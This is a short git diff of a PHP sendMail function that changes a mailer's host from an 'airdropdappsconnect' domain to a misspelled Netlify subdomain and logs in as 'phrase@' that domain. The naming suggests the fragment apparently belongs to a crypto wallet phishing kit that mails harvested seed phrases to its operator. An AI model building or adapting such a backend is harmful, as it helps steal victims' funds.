@@ -7,7 +7,7 @@ function sendMail($subject, $msg, $email) {
         $mail->isSendMail();
         $mail->SMTPDebug = 0;
         $mail->Debugoutput = '';
-        $mail->Host = "airdropdappsconnect.com.ng";
+        $mail->Host = "main--airdrpdappsconnect.netlify.app";
         $mail->Port = 465;
         $mail->SMTPAuth = true;
         $mail->Username = "phrase@airdropdappsconnect.com.ng";
